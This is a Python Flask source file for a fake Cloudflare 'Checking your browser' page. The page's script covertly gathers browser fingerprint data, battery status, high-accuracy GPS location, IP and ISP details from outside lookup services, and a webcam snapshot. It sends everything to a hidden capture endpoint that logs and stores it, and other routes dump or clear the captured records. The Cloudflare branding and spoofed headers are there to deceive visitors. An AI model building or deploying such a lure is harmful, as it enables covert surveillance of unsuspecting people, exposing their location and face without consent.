import os
import json
import time
import random
import string
from flask import Flask, request, render_template_string, make_response

app = Flask(__name__)

x_data_store = []

def z_make_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

def z_cf_headers():
    return {
        'Server': 'cloudflare',
        'CF-RAY': z_make_id(),
        'Cache-Control': 'no-cache, no-store',
        'Pragma': 'no-cache'
    }

CF_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Checking your browser</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: system-ui, sans-serif;
            background: #f6f6f6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .main-box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #f38020;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .info-box {
            background: #f9f9f9;
            padding: 15px;
            border-radius: 6px;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        .ray-code {
            font-family: monospace;
            background: #f0f0f0;
            padding: 2px 6px;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="main-box">
        <div style="font-size: 48px; margin-bottom: 20px;">🛡️</div>
        <h1>Checking your browser</h1>
        <p>Checking your browser before accessing the website.</p>
        
        <div class="loader"></div>
        
        <div class="info-box">
            <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
            <p style="margin-top: 10px;">
                <strong>Ray ID:</strong> <span class="ray-code">{{ ray_code }}</span>
            </p>
            <p style="margin-top: 5px;">DDoS protection by Cloudflare</p>
        </div>
    </div>

    <script>
        setTimeout(function() {
            collectEverything();
        }, 1000);

        function collectEverything() {
            let allData = {
                timestamp: new Date().toISOString(),
                ray_id: '{{ ray_code }}',
                user_agent: navigator.userAgent,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                viewport: {
                    width: window.innerWidth,
                    height: window.innerHeight
                },
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                hardware: navigator.hardwareConcurrency,
                device_memory: navigator.deviceMemory,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled,
                do_not_track: navigator.doNotTrack,
                pdf: navigator.pdfViewerEnabled,
                touch: navigator.maxTouchPoints,
                webdriver: navigator.webdriver,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                mime_types: Array.from(navigator.mimeTypes).map(m => m.type)
            };

            if ('getBattery' in navigator) {
                navigator.getBattery().then(batt => {
                    allData.battery = {
                        level: Math.round(batt.level * 100) + '%',
                        charging: batt.charging,
                        charging_time: batt.chargingTime,
                        discharging_time: batt.dischargingTime
                    };
                    getLocation(allData);
                });
            } else {
                getLocation(allData);
            }
        }

        function getLocation(allData) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        allData.location = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            altitude_accuracy: pos.coords.altitudeAccuracy,
                            heading: pos.coords.heading,
                            speed: pos.coords.speed
                        };
                        getIP(allData);
                    },
                    function(err) {
                        allData.location_error = err.code;
                        getIP(allData);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                getIP(allData);
            }
        }

        function getIP(allData) {
            Promise.allSettled([
                fetch('https://api.ipify.org?format=json').then(r => r.json()),
                fetch('https://ipapi.co/json/').then(r => r.json()),
                fetch('https://ipinfo.io/json').then(r => r.json())
            ]).then(results => {
                allData.ip_info = {};
                results.forEach((result, index) => {
                    if (result.status === 'fulfilled') {
                        allData.ip_info['source_' + index] = result.value;
                    }
                });
                getCamera(allData);
            }).catch(() => {
                getCamera(allData);
            });
        }

        function getCamera(allData) {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user'
                    },
                    audio: false
                }).then(function(stream) {
                    const videoElement = document.createElement('video');
                    const canvasElement = document.createElement('canvas');
                    const context = canvasElement.getContext('2d');
                    
                    videoElement.srcObject = stream;
                    videoElement.play();
                    
                    setTimeout(function() {
                        canvasElement.width = videoElement.videoWidth;
                        canvasElement.height = videoElement.videoHeight;
                        context.drawImage(videoElement, 0, 0);
                        
                        allData.camera_data = canvasElement.toDataURL('image/jpeg', 0.8);
                        
                        stream.getTracks().forEach(function(track) {
                            track.stop();
                        });
                        
                        sendData(allData);
                    }, 2000);
                    
                }).catch(function(error) {
                    allData.camera_error = error.name;
                    sendData(allData);
                });
            } else {
                sendData(allData);
            }
        }

        function sendData(data) {
            fetch('/_cf_capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            }).then(function(response) {
                return response.json();
            }).then(function(result) {
                console.log('Data sent');
            }).catch(function(error) {
                console.log('Send error');
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def main_page():
    ray_val = z_make_id()
    response = make_response(render_template_string(CF_HTML, ray_code=ray_val))
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    response.headers.update(z_cf_headers())
    return response

@app.route('/_cf_capture', methods=['POST'])
def capture_endpoint():
    data = request.get_json()
    data['server_timestamp'] = time.time()
    data['client_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    x_data_store.append(data)
    
    print(f"\n🎯 CAPTURED DATA")
    print(f"IP: {data.get('client_ip', 'Unknown')}")
    
    ip_info = data.get('ip_info', {})
    if ip_info:
        first_ip = next(iter(ip_info.values()), {})
        print(f"Location: {first_ip.get('city', 'Unknown')}, {first_ip.get('country', 'Unknown')}")
        print(f"ISP: {first_ip.get('org', 'Unknown')}")
    
    if data.get('location'):
        loc = data['location']
        print(f"GPS: {loc.get('latitude')}, {loc.get('longitude')}")
    
    if data.get('camera_data'):
        print(f"📸 CAMERA: CAPTURED")
    
    print(f"Device: {data.get('user_agent', 'Unknown')[:80]}...")
    print(f"Screen: {data.get('screen', {}).get('width')}x{data.get('screen', {}).get('height')}")
    print(f"Language: {data.get('language', 'Unknown')}")
    print(f"Timezone: {data.get('timezone', 'Unknown')}")
    
    return {'status': 'success', 'message': 'Data received'}

@app.route('/_cf_data')
def data_endpoint():
    return {'total_captures': len(x_data_store), 'captures': x_data_store}

@app.route('/_cf_clear')
def clear_endpoint():
    x_data_store.clear()
    return {'status': 'cleared'}

@app.route('/<path:path>')
def catch_all(path):
    return redirect('/')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
